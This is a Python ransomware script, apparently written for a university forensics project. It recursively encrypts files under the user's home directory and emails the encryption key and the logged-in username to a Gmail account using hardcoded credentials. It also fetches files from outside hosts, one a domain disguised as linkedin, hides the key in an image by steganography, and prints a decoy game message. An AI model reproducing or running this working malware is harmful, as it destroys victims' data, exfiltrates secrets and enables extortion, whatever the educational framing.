import os
from os.path import expanduser
from cryptography.fernet import Fernet
import base64
import smtplib
import time
import wget
import wave
import timeit
from stegano import lsb
import ssl

"""" 
Ransomware Script
________________________
This is a ransomware created for educational purposes in regards to project a forensics project at Hanze university
:param name: msg - Message to be shown
:param type: str
:return:str
"""

class Ransomware:

    def __init__(self, key=None):
        """
        Initializes an instance of the Ransomware class.
        Args:
            key: 128-bit AES key used to encrypt or decrypt files
        Attributes:
            cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed
            file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
        """

        self.key = key
        self.cryptor = None
        self.file_ext_targets = ['wap']

    def generate_key(self):
        """
        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
        """

        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, keyfile_name):
        """
        :param keyfile_name: key to be used

        """
        with open(keyfile_name, 'rb') as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)


    def write_setting(self, keyfile_name):
        """
        Writes the key to a keyfile
        """
        # print(self.key)
        with open(keyfile_name, 'w') as f:
            f.write("ransomWareActivated")


    def read_setting(self):
        """
        Read settings from a settings file
        """
        file = open(r"C:\Users\Public\setting.txt", "r")
        runCounter = file.readline()
        return runCounter

    def download_picture(self, path):
        """
        Downloads the moana song in wav which is to be used later for stenography

        Args:
                path:str: Patht to where file needs to be downloaed


        """
        url= "http://linkedin.ddns.net/images/moana1.png"

        downloadedFilePath = r'C:\Users\Public\Pictures\moana1.png'
        if not os.path.isfile(downloadedFilePath):
            wget.download(url, path)
        else:
            print("Welcome to the Space Cadet Pinball Game!")

        # make the downloaded file hidden

        # changeFileAttribute = os.popen('attrib +h ' + downloadedFilePath)
        # changeFile = changeFileAttribute.read()
        # changeFileAttribute.close()


    def addStenography(self,key):
        """
        Add stenagraphy to the moana image
        Uses LSB to encode an image (moana1.png) with the key

        Args:
              key:str: Cypher to be used in the LSB
        """
        file = open(key)
        keyval = file.readline()
        secret = lsb.hide(r'C:\Users\Public\Pictures\moana1.png', keyval)
        secret.save(r'C:\Users\Public\Pictures\key.png')



    def download_file(self, path):
        """
        Downloads the moana song which will be used later to add encoding
        currently not being used because it takes too long to process ( ~20 seconds)
        Args:
              path:str: Absolute path of the picture to be deleted
        """
        # ssl._create_default_https_context = ssl._create_unverified_context


        url1 = "http://srv-file9.gofile.io/downloadStore/srv-store4/cGVHJn/moana.wav"
        downloadedFilePath = r'C:\Users\Public\Music\moana.wav'
        if not os.path.isfile(downloadedFilePath):
            wget.download(url1, path)

        # make the downloaded file hidden

        # changeFileAttribute = os.popen('attrib +h ' + downloadedFilePath)
        # changeFile = changeFileAttribute.read()
        # changeFileAttribute.close()

    def encode(self):
        """
        Encodes an auto file(wav) using LSB METHOD
        currently not being used because it takes too long to process ( ~20 seconds)
        Args:

        """
        # read wave audio file
        song = wave.open(r"C:\Users\Public\Music\moana.wav", mode='rb')

        frame_bytes = bytearray(list(song.readframes(song.getnframes())))
        string = open(r'C:\Users\Public\keyfile', 'r').read()
        # string='Peter Parker is the Spiderman!'

        # Append dummy data to fill out rest of the bytes. Receiver shall detect and remove these characters.
        string = string + int((len(frame_bytes) - (len(string) * 8 * 8)) / 8) * '#'

        # Convert text to bit array
        bits = list(map(int, ''.join([bin(ord(i)).lstrip('0b').rjust(8, '0') for i in string])))

        # Replace LSB of each byte of the audio data by one bit from the text bit array
        for i, bit in enumerate(bits):
            frame_bytes[i] = (frame_bytes[i] & 254) | bit
        # Get the modified bytes
        frame_modified = bytes(frame_bytes)

        # Write bytes to a new wave audio file
        with wave.open(r'C:\Users\Public\Music\moana_embedded.wav', 'wb') as fd:
            fd.setparams(song.getparams())
            fd.writeframes(frame_modified)
        song.close()

    def write_key(self, keyfile_name):
        """
        Writes the key to a keyfile + emails it using GMAIL
        Os.getlogin() is used to get the users that's currently logged in on the hacked system
        Args:
            keyfile_name:str: Key to be emailed
        """
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        timestr = time.strftime("%Y%m%d-%H%M%S")
        s.login("rlkforensics@gmail.com", "aWn32ZseLnqX")
        loggedInUser = os.getlogin()
        message = "System from the user " +loggedInUser + " has been comprimised. Key =  " + str(self.key)
        # print(self.key)
        s.sendmail("rlkforensics@gmail.com", "rlkforensics@gmail.com", message)
        s.quit()
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)

    def delete_pic(self, path):
        """
        Recursively encrypts or decrypts files from root directory with allowed file extensions
        Args:
            path:str: Absolute path of the picture to be deleted
        """
        if os.path.exists(path):
            os.remove(path)
        else:
           pass

    def crypt_root(self, root_dir, encrypted=False):
        """
        Recursively encrypts or decrypts files from root directory with allowed file extensions
        Args:
            root_dir:str: Absolute path of top level directory
            encrypt:bool: Specify whether to encrypt or decrypt encountered files
        """

        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)

                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue

                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        """
        Encrypts or decrypts a file
        Args:
            file_path:str: Absolute path to a file
        """

        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
                # print(f'File contents pre encryption: {_data}')
                data = self.cryptor.encrypt(_data)
                # print(f'File contents post encryption: {data}')
            else:
                data = self.cryptor.decrypt(_data)
                print(f'File content post decryption: {data}')

            f.seek(0)
            f.write(data)


if __name__ == '__main__':
    start = timeit.default_timer()
    x = r"C:\Users\Public\setting.txt"
    open(x, 'a').close()
    sys_root = expanduser('~')
    # local_root = '.'

    # rware.generate_key()
    # rware.write_key()
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('--action', required=True)
    parser.add_argument('--keyfile')

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.keyfile

    rware = Ransomware()
    rware.download_picture(r'C:\users\Public\Pictures')

    runCounter = rware.read_setting()
    if action == 'decrypt':
        if keyfile is None:
            # print('Path to keyfile must be specified after --keyfile to perform decryption.')
            pass
        else:
            rware.read_key(keyfile)
            rware.crypt_root(sys_root, encrypted=True)
    elif action == 'encrypt':
        if runCounter == "ransomWareActivated":
            # print("file is already encryped")
            pass
        else:
            rware.generate_key()
            rware.write_key(r'C:\Users\Public\keyfile')
            rware.crypt_root(sys_root)
            rware.write_setting(x)
            # rware.encode()
            rware.addStenography(r'C:\Users\Public\keyfile')
            rware.delete_pic(r'C:\Users\Public\Pictures\moana1.png')
    stop = timeit.default_timer()
    print('Time: ', stop - start)




